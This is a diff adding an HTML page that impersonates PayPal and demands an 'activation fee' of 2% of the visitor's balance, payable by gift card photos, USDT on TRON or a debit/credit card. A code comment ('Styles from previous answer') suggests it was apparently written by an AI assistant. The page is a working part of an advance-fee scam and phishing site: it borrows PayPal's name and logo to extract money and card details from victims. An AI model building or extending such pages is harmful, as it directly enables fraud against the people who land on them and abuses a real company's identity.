@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Activation Payment - PayPal</title>
+    <link rel="icon" href="/favicon.ico">
+    <link rel="stylesheet" href="/style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        /* Styles from previous answer */
+        .payment-container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        .payment-amount {
+            background: white;
+            border-radius: 10px;
+            padding: 30px;
+            text-align: center;
+            margin-bottom: 30px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        }
+        .payment-amount h2 {
+            color: #333;
+            margin-bottom: 10px;
+        }
+        .amount {
+            font-size: 3rem;
+            color: #0070ba;
+            font-weight: bold;
+            margin: 20px 0;
+        }
+        .payment-methods {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+        }
+        .method {
+            background: white;
+            border-radius: 10px;
+            padding: 20px;
+            text-align: center;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            cursor: pointer;
+            transition: transform 0.3s;
+        }
+        .method:hover {
+            transform: translateY(-5px);
+        }
+        .method i {
+            font-size: 3rem;
+            margin-bottom: 20px;
+            color: #0070ba;
+        }
+        .method h3 {
+            margin-bottom: 10px;
+        }
+        .method p {
+            color: #666;
+            font-size: 0.9rem;
+        }
+    </style>
+</head>
+<body>
+    <nav class="nav-main">
+        <div class="nav-container">
+            <div class="nav-logo">
+                <img src="/assets/logo.png" alt="PayPal Logo">
+                <span>PayPal</span>
+            </div>
+            <div class="nav-menu">
+                <a href="/dashboard" class="nav-button"><i class="fas fa-arrow-left"></i> Back to Dashboard</a>
+            </div>
+        </div>
+    </nav>
+
+    <div class="container">
+        <div class="payment-container">
+            <div class="payment-amount">
+                <h2>Activation Fee</h2>
+                <p>To activate your account and unlock all features, please pay 2% of your current balance.</p>
+                <div class="amount" id="activationFee">Loading...</div>
+                <p>Your current balance: <strong id="currentBalance">Loading...</strong></p>
+            </div>
+
+            <h2 style="margin-bottom: 20px;">Choose Payment Method</h2>
+            <div class="payment-methods">
+                <div class="method" onclick="window.location.href='/activation-payment/giftcard'">
+                    <i class="fas fa-gift"></i>
+                    <h3>Gift Card</h3>
+                    <p>Pay using a gift card. You will be asked to take pictures of the gift card.</p>
+                </div>
+                <div class="method" onclick="window.location.href='/activation-payment/usdt'">
+                    <i class="fab fa-bitcoin"></i>
+                    <h3>USDT (TRC20)</h3>
+                    <p>Pay using USDT on the TRON network (TRC20).</p>
+                </div>
+                <div class="method" onclick="window.location.href='/activation-payment/card'">
+                    <i class="fas fa-credit-card"></i>
+                    <h3>Debit/Credit Card</h3>
+                    <p>Pay using your debit or credit card.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Fetch activation fee and current balance
+        fetch('/api/user')
+            .then(response => response.json())
+            .then(user => {
+                document.getElementById('currentBalance').textContent = '$' + user.balance.toFixed(2);
+                const activationFee = user.balance * 0.02;
+                document.getElementById('activationFee').textContent = '$' + activationFee.toFixed(2);
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                document.getElementById('activationFee').textContent = '$0.00';
+                document.getElementById('currentBalance').textContent = '$0.00';
+            });
+    </script>
+</body>
+</html>
